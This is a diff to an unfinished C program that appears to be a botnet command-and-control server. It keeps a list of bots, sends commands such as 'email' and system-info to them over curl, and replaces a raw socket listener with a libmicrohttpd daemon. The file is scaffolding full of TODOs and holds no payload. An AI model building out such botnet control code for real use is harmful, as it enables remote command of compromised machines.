@@ -1,5 +1,7 @@
 
 #include "common.h"
+#define PAGE "<html><head><title>libmicrohttpd demo</title>" \
+             "</head><body>libmicrohttpd demo</body></html>"
 
 // BRAINSTORMING
 
@@ -32,6 +34,25 @@ int initializeSemaphores();
 int closeSemaphores();
 void parent(int pid);
 void child();
+void hello();
+
+int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
+      const char *method, const char *version, const char *upload_data,
+      size_t *upload_data_size, void **con_cls)
+{
+   const char *msg = "OK";
+   struct MHD_Response *response;
+   int ret;
+
+   response = MHD_create_response_from_buffer(strlen(msg), (void *)msg, MHD_RESPMEM_PERSISTENT);
+   ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
+
+
+
+   MHD_destroy_response(response);
+
+   return ret;
+}
 
 int main(int argc, char const *argv[])
 {
@@ -48,35 +69,9 @@ int main(int argc, char const *argv[])
     ret = initializeSemaphores();
 
 
-    struct sockaddr_in server_addr = {0}, client_addr = {0};
-    int sockaddr_len = sizeof(struct sockaddr_in);
-
     botnet = (active_bots *)malloc(sizeof(active_bots));
     botnet->next = NULL;
 
-    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock_fd < 0)
-    {
-        handle_error("Socket not initialized");
-    }
-
-    printf("Socket created \n");
-
-    server_addr.sin_addr.s_addr = INADDR_ANY; // we want to accept connections from any interface
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(SERVER_PORT);
-
-    ret = bind(sock_fd, (struct sockaddr *)&server_addr, sockaddr_len);
-    if (ret < 0)
-    {
-        handle_error("Cannot bind address to socket");
-    }
-
-    ret = listen(sock_fd, MAX_CONN_QUEUE);
-    if (ret < 0)
-    {
-        handle_error("Listen on socket error");
-    }
 
     pid = fork();
     if (pid < 0)
@@ -87,13 +82,7 @@ int main(int argc, char const *argv[])
     {
         if (DEBUG)
             printf("Child process working,handle bot connection \n");
-        /*TODO
-            accept connections,
-             store bot info into active_bots  -> concurrent programming, the botnet struct is the critical section
-             PRODUCER
-             close connection
-undefined reference to `curl_easy_init'
-        */
+
         child();
     }
     else
@@ -271,9 +260,9 @@ void sendCommand(char *command, int bot_id)
 
         char url[30] = ""; // TODO this should be a malloc with size of parameters, (8 + ? + 10)
         char bot_ip[INET_ADDRSTRLEN];
-        long bot_port; //TODO this should be extracted from bot structure
+        long bot_port; // TODO this should be extracted from bot structure
 
-        //TODO write a function that fill bot_id and bot_ip side effect
+        // TODO write a function that fill bot_id and bot_ip side effect
 
         // inet_ntop(AF_INET, &(bot->bot_address.sin_addr), bot_ip, INET_ADDRSTRLEN);
 
@@ -281,7 +270,6 @@ void sendCommand(char *command, int bot_id)
         strcat(url, "localhost"); // TODO this must be the bot ip
 
         printf("%s \n", url);
-
 
         curl_easy_setopt(curl, CURLOPT_PORT, bot_port);
 
@@ -300,8 +288,7 @@ void sendCommand(char *command, int bot_id)
 
             strcat(url, "/email");
 
-            //TODO add request body
-
+            // TODO add request body
         }
         if (strcmp(command, SYS_INFO) == 0)
         {
@@ -417,14 +404,46 @@ void parent(int pid)
 void child()
 {
 
-    while (1)
-    {
+   struct MHD_Daemon *daemon;
 
-        /*
+      daemon = MHD_start_daemon(MHD_USE_SELECT_INTERNALLY, 8081, NULL, NULL, &handle_request, NULL, MHD_OPTION_END);
+      if (daemon == NULL) {
+         fprintf(stderr, "Error starting daemon.\n");
+         _exit(EXIT_FAILURE);
+      }
 
-        ricevi richieste http in cui viene specificato l'ip del bot e la sua porta, oppure estrai quest info
+       fprintf(stdout, "Child process started. Listening on port %d.\n", 8081);
+      while(1) { sleep(1); }
 
-
-        */
-    }
+    
 }
+
+/*
+
+    struct sockaddr_in server_addr = {0}, client_addr = {0};
+    int sockaddr_len = sizeof(struct sockaddr_in);
+    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock_fd < 0)
+    {
+        handle_error("Socket not initialized");
+    }
+
+    printf("Socket created \n");
+
+    server_addr.sin_addr.s_addr = INADDR_ANY; // we want to accept connections from any interface
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(SERVER_PORT);
+
+    ret = bind(sock_fd, (struct sockaddr *)&server_addr, sockaddr_len);
+    if (ret < 0)
+    {
+        handle_error("Cannot bind address to socket");
+    }
+
+    ret = listen(sock_fd, MAX_CONN_QUEUE);
+    if (ret < 0)
+    {
+        handle_error("Listen on socket error");
+    }
+
+*/
